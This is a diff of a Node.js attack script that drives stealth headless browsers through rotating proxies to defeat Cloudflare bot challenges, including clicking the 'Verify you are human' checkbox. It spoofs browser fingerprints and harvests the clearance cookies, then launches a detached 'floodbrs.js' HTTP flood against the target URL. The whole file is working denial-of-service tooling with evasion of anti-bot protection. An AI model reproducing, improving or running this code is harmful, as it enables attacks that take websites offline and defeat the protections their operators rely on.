@@ -1,555 +1,590 @@
 const fs = require('fs');
 const puppeteer = require('puppeteer-extra');
 const StealthPlugin = require('puppeteer-extra-plugin-stealth');
-const async = require('async');
-const { spawn, exec } = require('child_process');
+const UserAgent = require('user-agents');
+const { spawn } = require('child_process');
 
 puppeteer.use(StealthPlugin());
 
-const COOKIES_MAX_RETRIES = 5;
 const COLORS = {
     RED: '\x1b[31m',
-    PINK: '\x1b[35m',
     WHITE: '\x1b[37m',
     YELLOW: '\x1b[33m',
     GREEN: '\x1b[32m',
+    CYAN: '\x1b[36m',
     RESET: '\x1b[0m'
 };
 
-// ========== COMMAND LINE ARGUMENTS VALIDATION ==========
-if (process.argv.length < 6) {
-    console.error('Usage: node browser.js <targetURL> <threads> <proxyFile> <rate> <time>');
-    process.exit(1);
-}
+// Utility functions
+const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+const coloredLog = (color, text) => console.log(`${color}${text}${COLORS.RESET}`);
+const maskProxy = (proxy) => {
+    const parts = proxy.split(':');
+    return parts.length >= 2 ? `${parts[0]}.${parts[1]}.**.**:****` : proxy;
+};
 
+// Command-line arguments
 const targetURL = process.argv[2];
 const threads = parseInt(process.argv[3]);
 const proxyFile = process.argv[4];
 const rate = process.argv[5];
 const duration = parseInt(process.argv[6]);
 
-let totalSolves = 0;
-
-// ========== UTILITY FUNCTIONS ==========
-const generateRandomString = (minLength, maxLength) => {
-    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
-    return Array.from({ length }, () => characters[Math.floor(Math.random() * characters.length)]).join('');
-};
-
-const validKey = generateRandomString(5, 10);
-
+// Read proxies
 const readProxies = (filePath) => {
     try {
         return fs.readFileSync(filePath, 'utf8').trim().split(/\r?\n/).filter(Boolean);
     } catch (error) {
-        console.error('Error reading proxies file:', error.message);
+        coloredLog(COLORS.RED, 'Error reading proxies file');
         return [];
     }
 };
 
-const maskProxy = (proxy) => {
-    const parts = proxy.split(':');
-    if (parts.length >= 2 && parts[0].split('.').length === 4) {
-        const ipParts = parts[0].split('.');
-        return `${ipParts[0]}.${ipParts[1]}.**.**:****`;
-    }
-    return proxy;
+// Generate realistic user agent
+const generateUserAgent = () => {
+    const userAgent = new UserAgent({ deviceCategory: 'desktop' });
+    return userAgent.toString();
 };
 
-const coloredLog = (color, text) => {
-    console.log(`${color}${text}${COLORS.RESET}`);
-};
-
-const sleep = (seconds) => new Promise(resolve => setTimeout(resolve, seconds * 1000));
-
-const randomElement = (array) => array[Math.floor(Math.random() * array.length)];
-
-// ========== USER AGENTS ==========
-const userAgents = [
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
-    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'
-];
-
-// ========== ENHANCED FIREWALL BYPASS ==========
-const bypassFirewall = async (page) => {
-    await page.evaluateOnNewDocument(() => {
-        Object.defineProperty(navigator, 'webdriver', { get: () => false });
-        Object.defineProperty(navigator, 'plugins', { 
-            get: () => [1, 2, 3, 4, 5]
-        });
+// NEW: Enhanced Cloudflare detection untuk flow spesifik
+const detectCloudflareFlow = async (page) => {
+    try {
+        const title = await page.title();
+        const url = page.url();
+        const content = await page.content();
         
-        const originalQuery = window.navigator.permissions.query;
-        window.navigator.permissions.query = (parameters) => (
-            parameters.name === 'notifications' ? 
-                Promise.resolve({ state: Notification.permission }) : 
-                originalQuery(parameters)
-        );
+        // Stage 1: Initial loading "Just a moment..."
+        if ((title.includes('Just a moment') || title.includes('Checking your browser')) && 
+            (content.includes('Verifying...') || content.includes('cf-spinner'))) {
+            return { 
+                stage: 'initial_loading', 
+                message: 'Initial loading spinner - waiting 15-20s' 
+            };
+        }
+        
+        // Stage 2: Post-refresh loading (setelah auto-refresh)
+        if ((title.includes('Just a moment') || title.includes('Checking your browser')) && 
+            !content.includes('Verify you are human') && 
+            !content.includes('Bukti bahwa Anda adalah manusia')) {
+            return { 
+                stage: 'refresh_loading', 
+                message: 'Post-refresh loading - waiting for checkbox' 
+            };
+        }
+        
+        // Stage 3: Checkbox ready
+        if (content.includes('Verify you are human') || 
+            content.includes('Bukti bahwa Anda adalah manusia') ||
+            content.includes('cf-challenge-waiting') ||
+            content.match(/input.*type.*checkbox.*challenge/)) {
+            return { 
+                stage: 'checkbox_ready', 
+                message: 'Checkbox is ready to be clicked' 
+            };
+        }
+        
+        // Stage 4: Challenge solved
+        if (!title.includes('Just a moment') && 
+            !title.includes('Checking your browser') &&
+            !url.includes('challenge') &&
+            !url.includes('cdn-cgi')) {
+            return { 
+                stage: 'solved', 
+                message: 'Cloudflare challenge solved' 
+            };
+        }
+        
+        return { stage: 'unknown', message: 'Unknown Cloudflare state' };
+        
+    } catch (error) {
+        return { stage: 'error', message: error.message };
+    }
+};
 
-        window.chrome = {
-            runtime: {
-                connect: () => ({ onDisconnect: { addListener: () => {} } }),
-                sendMessage: () => {},
-                onMessage: { addListener: () => {} }
-            },
-            loadTimes: () => ({}),
-            csi: () => ({}),
-            app: { isInstalled: false },
-            webstore: { onInstallStageChanged: {}, onDownloadProgress: {} }
-        };
+// NEW: Specialized solver untuk flow Loading → Refresh → Loading → Checkbox
+const solveCloudflareChallenge = async (page, proxy) => {
+    try {
+        coloredLog(COLORS.WHITE, `[SOLVER] Starting flow-based solver: ${maskProxy(proxy)}`);
+        
+        let totalWaitTime = 0;
+        let refreshCount = 0;
+        const maxRefreshCount = 3;
+        
+        while (refreshCount < maxRefreshCount) {
+            const flowState = await detectCloudflareFlow(page);
+            coloredLog(COLORS.CYAN, `[FLOW ${refreshCount + 1}] ${flowState.stage}: ${flowState.message}`);
+            
+            switch (flowState.stage) {
+                case 'solved':
+                    coloredLog(COLORS.GREEN, `[SOLVER] SUCCESS: Challenge already solved`);
+                    return { success: true, method: 'already_solved' };
+                    
+                case 'initial_loading':
+                    coloredLog(COLORS.WHITE, `[FLOW] Stage 1: Waiting for initial loading (15-25s)...`);
+                    const initialResult = await handleInitialLoading(page);
+                    totalWaitTime += initialResult.waitTime || 0;
+                    break;
+                    
+                case 'refresh_loading':
+                    coloredLog(COLORS.YELLOW, `[FLOW] Stage 2: Detected refresh, waiting for checkbox...`);
+                    const refreshResult = await handleRefreshLoading(page);
+                    totalWaitTime += refreshResult.waitTime || 0;
+                    refreshCount++;
+                    break;
+                    
+                case 'checkbox_ready':
+                    coloredLog(COLORS.GREEN, `[FLOW] Stage 3: Checkbox ready! Clicking...`);
+                    const clickResult = await handleCheckboxClick(page);
+                    if (clickResult.success) {
+                        coloredLog(COLORS.GREEN, `[SOLVER] SUCCESS: Checkbox clicked successfully`);
+                        return { 
+                            success: true, 
+                            method: 'checkbox_click', 
+                            totalWaitTime,
+                            refreshCount 
+                        };
+                    }
+                    break;
+                    
+                default:
+                    coloredLog(COLORS.RED, `[FLOW] Unknown state, waiting 5s...`);
+                    await sleep(5000);
+                    totalWaitTime += 5000;
+            }
+            
+            // Safety timeout
+            if (totalWaitTime > 120000) { // 2 menit
+                coloredLog(COLORS.RED, `[SOLVER] TIMEOUT: Exceeded 2 minutes total wait time`);
+                break;
+            }
+            
+            await sleep(2000);
+            totalWaitTime += 2000;
+        }
+        
+        coloredLog(COLORS.RED, `[SOLVER] FAILED: Too many refreshes or timeout`);
+        return { success: false, method: 'flow_failed', totalWaitTime, refreshCount };
+        
+    } catch (error) {
+        coloredLog(COLORS.RED, `[SOLVER] ERROR: ${error.message}`);
+        return { success: false, method: 'error', error: error.message };
+    }
+};
 
-        const getParameter = WebGLRenderingContext.prototype.getParameter;
-        WebGLRenderingContext.prototype.getParameter = function(parameter) {
-            if (parameter === 37445) return 'Intel Inc.';
-            if (parameter === 37446) return 'Intel Iris OpenGL Engine';
-            return getParameter.apply(this, arguments);
-        };
+// NEW: Handle initial loading stage (15-25 detik)
+const handleInitialLoading = async (page) => {
+    const startTime = Date.now();
+    coloredLog(COLORS.WHITE, `[LOADING] Waiting for initial loading completion...`);
+    
+    let lastState = 'initial_loading';
+    
+    while (Date.now() - startTime < 30000) { // Max 30 detik
+        const currentState = await detectCloudflareFlow(page);
+        
+        if (currentState.stage !== lastState) {
+            coloredLog(COLORS.CYAN, `[LOADING] State changed: ${lastState} → ${currentState.stage}`);
+            lastState = currentState.stage;
+        }
+        
+        // Jika pindah ke stage lain, keluar
+        if (currentState.stage !== 'initial_loading') {
+            const waitTime = Date.now() - startTime;
+            coloredLog(COLORS.GREEN, `[LOADING] Completed in ${waitTime}ms → ${currentState.stage}`);
+            return { success: true, waitTime, nextStage: currentState.stage };
+        }
+        
+        // Simulasi aktivitas manusia selama waiting
+        if (Math.random() > 0.8) {
+            await page.mouse.move(100 + Math.random() * 500, 100 + Math.random() * 300);
+        }
+        
+        await sleep(3000);
+    }
+    
+    coloredLog(COLORS.RED, `[LOADING] Timeout waiting for initial loading`);
+    return { success: false, waitTime: 30000 };
+};
 
-        Object.defineProperty(navigator, 'languages', {
-            get: () => ['en-US', 'en']
-        });
+// NEW: Handle refresh loading stage (tunggu sampai checkbox muncul)
+const handleRefreshLoading = async (page) => {
+    const startTime = Date.now();
+    coloredLog(COLORS.YELLOW, `[REFRESH] Monitoring for checkbox appearance...`);
+    
+    while (Date.now() - startTime < 45000) { // Max 45 detik
+        const currentState = await detectCloudflareFlow(page);
+        
+        if (currentState.stage === 'checkbox_ready') {
+            const waitTime = Date.now() - startTime;
+            coloredLog(COLORS.GREEN, `[REFRESH] Checkbox appeared after ${waitTime}ms`);
+            return { success: true, waitTime };
+        }
+        
+        if (currentState.stage === 'solved') {
+            coloredLog(COLORS.GREEN, `[REFRESH] Challenge solved during refresh wait`);
+            return { success: true, waitTime: Date.now() - startTime, solved: true };
+        }
+        
+        // Check every 2-4 seconds
+        await sleep(2000 + Math.random() * 2000);
+    }
+    
+    coloredLog(COLORS.RED, `[REFRESH] Timeout waiting for checkbox`);
+    return { success: false, waitTime: 45000 };
+};
 
-        Object.defineProperty(navigator, 'hardwareConcurrency', {
-            value: 8
-        });
+// NEW: Optimized checkbox click berdasarkan POV Anda
+const handleCheckboxClick = async (page) => {
+    try {
+        coloredLog(COLORS.WHITE, `[CHECKBOX] Finding and clicking verification checkbox...`);
+        
+        // Tunggu sebentar untuk memastikan checkbox fully rendered
+        await sleep(2000);
+        
+        // Strategy 1: Cari berdasarkan atribut spesifik Cloudflare
+        const cfSelectors = [
+            'input[type="checkbox"][name="cf_captcha_kind"]',
+            '.hcaptcha-box',
+            '.cf-challenge',
+            '[data-sitekey]',
+            '.challenge-form input[type="checkbox"]',
+            '#challenge-form input[type="checkbox"]',
+            'iframe[src*="challenge"]',
+            'iframe[src*="hcaptcha"]'
+        ];
+        
+        for (const selector of cfSelectors) {
+            try {
+                const element = await page.$(selector);
+                if (element) {
+                    const isVisible = await element.evaluate(el => {
+                        const rect = el.getBoundingClientRect();
+                        return rect.width > 0 && rect.height > 0 && 
+                               el.offsetParent !== null &&
+                               el.disabled === false;
+                    });
+                    
+                    if (isVisible) {
+                        coloredLog(COLORS.CYAN, `[CHECKBOX] Found Cloudflare element: ${selector}`);
+                        
+                        // Scroll ke element
+                        await element.evaluate(el => {
+                            el.scrollIntoView({ 
+                                behavior: 'smooth', 
+                                block: 'center',
+                                inline: 'center'
+                            });
+                        });
+                        
+                        await sleep(1500);
+                        
+                        // Human-like delay sebelum click
+                        await sleep(1000 + Math.random() * 1000);
+                        
+                        // Click dengan options untuk bypass detection
+                        await element.click({ delay: 100 + Math.random() * 200 });
+                        coloredLog(COLORS.GREEN, `[CHECKBOX] Clicked: ${selector}`);
+                        
+                        // Tunggu proses verifikasi
+                        await sleep(10000);
+                        
+                        // Verifikasi hasil
+                        const finalState = await detectCloudflareFlow(page);
+                        if (finalState.stage === 'solved') {
+                            coloredLog(COLORS.GREEN, `[CHECKBOX] VERIFIED: Challenge solved after click`);
+                            return { success: true, method: selector };
+                        } else {
+                            coloredLog(COLORS.YELLOW, `[CHECKBOX] Click executed but still in: ${finalState.stage}`);
+                            // Mungkin butuh waktu lebih lama
+                            await sleep(8000);
+                            const finalCheck = await detectCloudflareFlow(page);
+                            if (finalCheck.stage === 'solved') {
+                                return { success: true, method: `${selector}_delayed` };
+                            }
+                        }
+                    }
+                }
+            } catch (e) {
+                // Continue ke selector berikutnya
+            }
+        }
+        
+        // Strategy 2: Cari berdasarkan text yang Anda sebutkan
+        coloredLog(COLORS.WHITE, `[CHECKBOX] Trying text-based search...`);
+        const verifyTexts = [
+            'Verify you are human',
+            'Bukti bahwa Anda adalah manusia',
+            'I am human',
+            'Saya manusia',
+            'Verify',
+            'Verifikasi'
+        ];
+        
+        for (const text of verifyTexts) {
+            try {
+                const [element] = await page.$x(`//*[contains(translate(text(), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), '${text.toLowerCase()}')]`);
+                
+                if (element) {
+                    coloredLog(COLORS.CYAN, `[CHECKBOX] Found text: "${text}"`);
+                    
+                    // Cari element yang bisa di-click di sekitar text
+                    const clickableElement = await element.evaluateHandle((el) => {
+                        // Cari parent yang mungkin button/checkbox
+                        let parent = el;
+                        for (let i = 0; i < 6; i++) {
+                            parent = parent.parentElement;
+                            if (!parent) break;
+                            
+                            if (parent.tagName === 'BUTTON' || 
+                                parent.getAttribute('role') === 'button' ||
+                                parent.querySelector('input[type="checkbox"]') ||
+                                parent.onclick ||
+                                parent.getAttribute('onclick')) {
+                                return parent;
+                            }
+                        }
+                        return el;
+                    });
+                    
+                    if (clickableElement) {
+                        await clickableElement.evaluate(el => {
+                            el.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                        });
+                        
+                        await sleep(1000);
+                        await clickableElement.click();
+                        coloredLog(COLORS.GREEN, `[CHECKBOX] Clicked text element: ${text}`);
+                        
+                        await sleep(10000);
+                        
+                        const finalState = await detectCloudflareFlow(page);
+                        if (finalState.stage === 'solved') {
+                            return { success: true, method: `text_${text}` };
+                        }
+                    }
+                }
+            } catch (e) {
+                // Continue
+            }
+        }
+        
+        coloredLog(COLORS.RED, `[CHECKBOX] All strategies failed`);
+        return { success: false };
+        
+    } catch (error) {
+        coloredLog(COLORS.RED, `[CHECKBOX] ERROR: ${error.message}`);
+        return { success: false, error: error.message };
+    }
+};
 
-        Object.defineProperty(navigator, 'deviceMemory', {
-            value: 8
-        });
+// Browser configuration
+const createBrowser = async () => {
+    const userAgent = generateUserAgent();
+    
+    const args = [
+        '--no-sandbox',
+        '--disable-setuid-sandbox',
+        '--disable-dev-shm-usage',
+        '--disable-accelerated-2d-canvas',
+        '--disable-gpu',
+        '--no-first-run',
+        '--no-default-browser-check',
+        '--disable-background-timer-throttling',
+        '--disable-backgrounding-occluded-windows',
+        '--ignore-certificate-errors',
+        '--ignore-ssl-errors',
+        '--disable-web-security',
+        '--window-size=1920,1080',
+        `--user-agent=${userAgent}`
+    ];
 
-        delete navigator.__proto__.webdriver;
+    return await puppeteer.launch({
+        headless: true,
+        args: args,
+        ignoreHTTPSErrors: true
     });
+};
 
-    await page.setUserAgent(randomElement(userAgents));
+// Stealth setup
+const setupStealth = async (page) => {
     await page.setViewport({
         width: 1920 + Math.floor(Math.random() * 100),
         height: 1080 + Math.floor(Math.random() * 100),
         deviceScaleFactor: 1,
+        isMobile: false,
         hasTouch: false,
-        isLandscape: false,
-        isMobile: false
+        isLandscape: true
     });
 
-    await page.setRequestInterception(true);
-    page.on('request', (req) => {
-        const resourceType = req.resourceType();
-        if (['image', 'font', 'media'].includes(resourceType)) {
-            req.abort();
-        } else {
-            req.continue();
-        }
+    await page.setExtraHTTPHeaders({
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+        'Accept-Language': 'en-US,en;q=0.9',
+        'Accept-Encoding': 'gzip, deflate, br',
+        'Cache-Control': 'no-cache'
     });
-};
 
-const getFirewallBypassArgs = () => [
-    '--no-sandbox',
-    '--disable-setuid-sandbox',
-    '--disable-infobars',
-    '--window-position=0,0',
-    '--ignore-certificate-errors',
-    '--ignore-certificate-errors-spki-list',
-    '--disable-web-security',
-    '--disable-features=IsolateOrigins,site-per-process',
-    '--disable-site-isolation-trials',
-    '--disable-blink-features=AutomationControlled',
-    '--no-default-browser-check',
-    '--disable-default-apps',
-    '--disable-extensions',
-    '--disable-translate',
-    '--disable-component-update',
-    '--no-first-run',
-    '--disable-background-timer-throttling',
-    '--disable-renderer-backgrounding',
-    '--disable-backgrounding-occluded-windows',
-    '--disable-client-side-phishing-detection',
-    '--disable-popup-blocking',
-    '--disable-prompt-on-repost',
-    '--disable-hang-monitor',
-    '--disable-sync',
-    '--disable-domain-reliability',
-    '--disable-ipc-flooding-protection',
-    '--disable-back-forward-cache',
-    '--enable-features=NetworkService,NetworkServiceInProcess',
-    '--hide-scrollbars',
-    '--metrics-recording-only',
-    '--mute-audio',
-    '--password-store=basic',
-    '--use-mock-keychain',
-    '--disable-dev-shm-usage',
-    '--disable-accelerated-2d-canvas',
-    '--disable-gpu',
-    '--remote-debugging-port=0'
-];
-
-// ========== CHALLENGE SOLVING ==========
-const solveAdvancedChallenge = async (page, browserProxy) => {
-    try {
-        console.log(`[DEBUG] Solving challenge for proxy: ${maskProxy(browserProxy)}`);
-        await page.waitForTimeout(5000 + Math.random() * 3000);
-
-        const url = page.url();
-        const title = await page.title().catch(() => '');
-        const content = await page.content().catch(() => '');
-
-        console.log(`[DEBUG] Current URL: ${url}`);
-        console.log(`[DEBUG] Page title: ${title}`);
-
-        const isChallenge = title.includes('Just a moment') || 
-                           title.includes('Checking your browser') ||
-                           title.includes('Attention Required') ||
-                           content.includes('challenge-platform') ||
-                           content.includes('cf-browser-verification') ||
-                           url.includes('challenges.cloudflare.com') ||
-                           content.includes('cf_captcha_kind');
-
-        if (!isChallenge) {
-            console.log(`[DEBUG] No challenge detected`);
-            return true;
-        }
-
-        console.log(`[DEBUG] Challenge detected, attempting to solve...`);
-
-        // Strategy 1: Wait for auto-redirect
-        try {
-            await page.waitForNavigation({ 
-                waitUntil: 'networkidle2', 
-                timeout: 20000 
-            });
-            console.log(`[DEBUG] Auto-redirect successful`);
-            return true;
-        } catch (e) {
-            console.log(`[DEBUG] Auto-redirect failed: ${e.message}`);
-        }
-
-        // Strategy 2: Challenge iframe
-        const challengeFrame = await page.$('iframe[src*="challenges"], iframe[src*="captcha"]');
-        if (challengeFrame) {
-            console.log(`[DEBUG] Found challenge iframe`);
-            try {
-                const frame = await challengeFrame.contentFrame();
-                if (frame) {
-                    await frame.waitForTimeout(3000);
-                    const submitButton = await frame.$(
-                        'input[type="submit"], button[type="submit"], .btn, #challenge-submit, [class*="submit"], [class*="button"]'
-                    );
-                    
-                    if (submitButton) {
-                        await submitButton.click({ delay: 100 + Math.random() * 200 });
-                        console.log(`[DEBUG] Clicked submit button in iframe`);
-                        await page.waitForTimeout(8000);
-                        return true;
-                    }
-                }
-            } catch (frameError) {
-                console.log(`[DEBUG] Iframe interaction failed: ${frameError.message}`);
-            }
-        }
-
-        // Strategy 3: Direct page interaction
-        const pageSubmitButton = await page.$(
-            'input[type="submit"], button[type="submit"], .btn, #challenge-submit, [class*="submit"], [class*="button"]'
-        );
-        
-        if (pageSubmitButton) {
-            console.log(`[DEBUG] Found submit button on main page`);
-            await pageSubmitButton.click({ delay: 100 + Math.random() * 200 });
-            await page.waitForTimeout(8000);
-            return true;
-        }
-
-        // Strategy 4: Human simulation
-        console.log(`[DEBUG] Attempting human simulation`);
-        await simulateAdvancedHumanBehavior(page);
-        
-        // Strategy 5: Form submission
-        const forms = await page.$$('form');
-        for (const form of forms) {
-            try {
-                await form.evaluate(form => form.submit());
-                console.log(`[DEBUG] Submitted form`);
-                await page.waitForTimeout(5000);
-                break;
-            } catch (e) {}
-        }
-
-        // Final check
-        await page.waitForTimeout(10000);
-        const newUrl = page.url();
-        if (!newUrl.includes('challenges.cloudflare.com')) {
-            console.log(`[DEBUG] Challenge appears to be solved`);
-            return true;
-        }
-
-        console.log(`[DEBUG] All challenge solving strategies failed`);
-        return false;
-
-    } catch (error) {
-        console.log(`[DEBUG] Error in challenge solving: ${error.message}`);
-        return false;
-    }
-};
-
-const simulateAdvancedHumanBehavior = async (page) => {
-    try {
-        const viewport = page.viewport();
-        const moves = 5 + Math.floor(Math.random() * 8);
-        
-        for (let i = 0; i < moves; i++) {
-            const x = Math.random() * viewport.width;
-            const y = Math.random() * viewport.height;
-            await page.mouse.move(x, y, { 
-                steps: 10 + Math.floor(Math.random() * 20) 
-            });
-            await page.waitForTimeout(100 + Math.random() * 300);
-        }
-
-        const scrollAmount = Math.random() * 1000;
-        await page.evaluate((amount) => {
-            window.scrollBy(0, amount);
-        }, scrollAmount);
-
-        await page.waitForTimeout(1000 + Math.random() * 2000);
-
-        await page.mouse.move(
-            Math.random() * viewport.width,
-            Math.random() * viewport.height,
-            { steps: 5 }
-        );
-
-    } catch (error) {
-        // Ignore mouse movement errors
-    }
-};
-
-// ========== PROXY HANDLING ==========
-const setupProxy = (browserProxy) => {
-    if (!browserProxy) return null;
-    
-    const proxyParts = browserProxy.split(':');
-    if (proxyParts.length === 2) {
-        return `--proxy-server=http://${browserProxy}`;
-    } else if (proxyParts.length === 4) {
-        return `--proxy-server=http://${proxyParts[0]}:${proxyParts[1]}`;
-    }
-    return null;
-};
-
-// ========== BROWSER LAUNCH ==========
-const launchBrowserWithRetry = async (targetURL, browserProxy, attempt = 1, maxRetries = 3) => {
-    const userAgent = randomElement(userAgents);
-    let browser = null;
-
-    const launchOptions = {
-        headless: "new",
-        args: [
-            ...getFirewallBypassArgs(),
-            '--disable-web-security',
-            '--disable-features=IsolateOrigins,site-per-process',
-            '--disable-site-isolation-trials'
-        ],
-        defaultViewport: {
-            width: 1920 + Math.floor(Math.random() * 100),
-            height: 1080 + Math.floor(Math.random() * 100),
-            deviceScaleFactor: 1,
-            isMobile: false,
-            hasTouch: false,
-            isLandscape: false
-        },
-        ignoreHTTPSErrors: true
-    };
-
-    // Add proxy if available
-    const proxyArg = setupProxy(browserProxy);
-    if (proxyArg) {
-        launchOptions.args.push(proxyArg);
-    }
-
-    try {
-        coloredLog(COLORS.YELLOW, `[INFO] Launching browser (attempt ${attempt}/${maxRetries}) with proxy: ${maskProxy(browserProxy)}`);
-        
-        browser = await puppeteer.launch(launchOptions);
-        const [page] = await browser.pages();
-
-        await page.setUserAgent(userAgent);
-        await bypassFirewall(page);
-
-        // Handle proxy authentication
-        const proxyParts = browserProxy.split(':');
-        if (proxyParts.length === 4) {
-            await page.authenticate({
-                username: proxyParts[2],
-                password: proxyParts[3]
-            });
-        }
-
-        page.setDefaultNavigationTimeout(60000);
-        page.setDefaultTimeout(30000);
-
-        await page.goto(targetURL, {
-            waitUntil: 'networkidle2',
-            timeout: 60000
+    await page.evaluateOnNewDocument(() => {
+        Object.defineProperty(navigator, 'plugins', {
+            get: () => [1, 2, 3, 4, 5]
         });
+        Object.defineProperty(navigator, 'webdriver', {
+            get: () => false
+        });
+        Object.defineProperty(navigator, 'language', {
+            get: () => 'en-US'
+        });
+        Object.defineProperty(navigator, 'languages', {
+            get: () => ['en-US', 'en']
+        });
+    });
+};
 
-        const challengeSolved = await solveAdvancedChallenge(page, browserProxy);
-        if (!challengeSolved) {
-            throw new Error('Challenge solving failed');
-        }
-
-        const finalUrl = page.url();
-        if (finalUrl.includes('challenges.cloudflare.com') || 
-            finalUrl.includes('captcha') ||
-            (await page.title()).includes('Just a moment')) {
-            throw new Error('Still on challenge page after solving attempt');
-        }
-
+// Extract cookies
+const extractCookies = async (page) => {
+    try {
+        await sleep(3000);
         const cookies = await page.cookies();
-        if (!cookies || cookies.length === 0) {
-            throw new Error('No cookies obtained');
-        }
-
         const cookieString = cookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');
         
-        coloredLog(COLORS.GREEN, `[SUCCESS] Got cookies for proxy: ${maskProxy(browserProxy)}`);
-        totalSolves++;
+        const cfCookies = cookies.filter(cookie => 
+            cookie.name.includes('cf_') || cookie.name.includes('_cf')
+        );
+        
+        coloredLog(COLORS.GREEN, `[COOKIES] Extracted ${cookies.length} cookies, ${cfCookies.length} Cloudflare`);
+        return { success: true, cookies: cookieString };
+        
+    } catch (error) {
+        coloredLog(COLORS.RED, `[COOKIES] ERROR: ${error.message}`);
+        return { success: false, cookies: '' };
+    }
+};
+
+// Main browser function
+const launchBrowser = async (targetURL, proxy, index, total) => {
+    let browser;
+    try {
+        coloredLog(COLORS.YELLOW, `[BROWSER ${index}/${total}] Launching: ${maskProxy(proxy)}`);
+        
+        browser = await createBrowser();
+        const page = await browser.newPage();
+        
+        await setupStealth(page);
+        
+        coloredLog(COLORS.WHITE, `[BROWSER ${index}/${total}] Navigating...`);
+        await page.goto(targetURL, { 
+            waitUntil: 'networkidle0',
+            timeout: 60000 
+        });
+        
+        // Solve challenge dengan flow baru
+        const challengeResult = await solveCloudflareChallenge(page, proxy);
+        
+        if (!challengeResult.success) {
+            throw new Error(`Challenge failed: ${challengeResult.method}`);
+        }
+        
+        coloredLog(COLORS.GREEN, `[SUCCESS ${index}/${total}] Solved! Method: ${challengeResult.method}, Wait: ${challengeResult.totalWaitTime}ms, Refreshes: ${challengeResult.refreshCount}`);
+        
+        // Extract cookies
+        const cookieResult = await extractCookies(page);
+        
+        if (cookieResult.success && cookieResult.cookies) {
+            // Launch flood process
+            const floodProcess = spawn('node', [
+                'floodbrs.js',
+                targetURL,
+                duration.toString(),
+                rate,
+                '1',
+                proxyFile,
+                cookieResult.cookies,
+                generateUserAgent(),
+                'cf-session-key'
+            ], {
+                detached: true,
+                stdio: 'ignore'
+            });
+            
+            floodProcess.unref();
+            coloredLog(COLORS.GREEN, `[ATTACK ${index}/${total}] Flood process started`);
+        }
         
         await browser.close();
-        return {
-            title: await page.title(),
-            browserProxy,
-            cookies: cookieString,
-            userAgent
-        };
-
+        return { success: true, ...challengeResult };
+        
     } catch (error) {
-        coloredLog(COLORS.RED, `[ERROR] Attempt ${attempt} failed for ${maskProxy(browserProxy)}: ${error.message}`);
-        
-        if (browser) {
-            try {
-                await browser.close();
-            } catch (e) {}
-        }
-
-        if (attempt < maxRetries) {
-            const delay = Math.pow(2, attempt) * 1000;
-            await sleep(delay / 1000);
-            return launchBrowserWithRetry(targetURL, browserProxy, attempt + 1, maxRetries);
-        }
-        
-        return null;
+        if (browser) await browser.close();
+        coloredLog(COLORS.RED, `[BROWSER ${index}/${total}] ERROR: ${error.message}`);
+        return { success: false, error: error.message };
     }
 };
 
-// ========== THREAD MANAGEMENT ==========
-const startThread = async (targetURL, browserProxy, task, done, retries = 0) => {
-    if (retries >= COOKIES_MAX_RETRIES) {
-        coloredLog(COLORS.RED, `[FAILED] Max retries reached for proxy: ${maskProxy(browserProxy)}`);
-        done(null, { task, currentTask: queue.length() });
-        return;
-    }
-
-    try {
-        const response = await launchBrowserWithRetry(targetURL, browserProxy);
-        
-        if (response) {
-            if (response.title.includes('Just a moment') || response.title.includes('Checking your browser')) {
-                coloredLog(COLORS.RED, `[INFO] Challenge bypass incomplete for proxy: ${maskProxy(browserProxy)}`);
-                await startThread(targetURL, browserProxy, task, done, retries + 1);
-                return;
-            }
-
-            const cookieInfo = {
-                Page: response.title,
-                Proxy: maskProxy(browserProxy),
-                'User-agent': response.userAgent,
-                cookie: response.cookies.substring(0, 50) + '...'
-            };
-            
-            coloredLog(COLORS.GREEN, `[SUCCESS] Obtained cookies: ${JSON.stringify(cookieInfo, null, 2)}`);
-
-            // Spawn flood process
-            try {
-                coloredLog(COLORS.YELLOW, `[INFO] Spawning floodbrs for proxy: ${maskProxy(browserProxy)}`);
-                
-                const floodProcess = spawn('node', [
-                    'floodbrs.js',
-                    targetURL,
-                    duration.toString(),
-                    rate,
-                    threads.toString(),
-                    proxyFile,
-                    response.cookies,
-                    response.userAgent,
-                    validKey
-                ], {
-                    detached: true,
-                    stdio: 'ignore'
-                });
-                
-                floodProcess.unref();
-                coloredLog(COLORS.GREEN, `[INFO] Successfully spawned floodbrs process`);
-                
-            } catch (spawnError) {
-                coloredLog(COLORS.RED, `[ERROR] Failed to spawn floodbrs: ${spawnError.message}`);
-            }
-
-            done(null, { task });
-        } else {
-            await startThread(targetURL, browserProxy, task, done, retries + 1);
-        }
-    } catch (error) {
-        coloredLog(COLORS.RED, `[ERROR] Thread error: ${error.message}`);
-        await startThread(targetURL, browserProxy, task, done, retries + 1);
-    }
-};
-
-// ========== QUEUE SETUP ==========
-const queue = async.queue((task, done) => {
-    startThread(targetURL, task.browserProxy, task, done);
-}, threads);
-
-queue.drain(() => {
-    coloredLog(COLORS.GREEN, '[INFO] All proxies processed');
-});
-
-// ========== MAIN EXECUTION ==========
+// Main execution
 const main = async () => {
     const proxies = readProxies(proxyFile);
     if (proxies.length === 0) {
-        coloredLog(COLORS.RED, '[ERROR] No proxies found in file');
-        process.exit(1);
+        coloredLog(COLORS.RED, '[ERROR] No proxies found');
+        return;
     }
 
-    coloredLog(COLORS.GREEN, `[START] Launching with ${proxies.length} proxies, ${threads} threads, ${duration}s duration`);
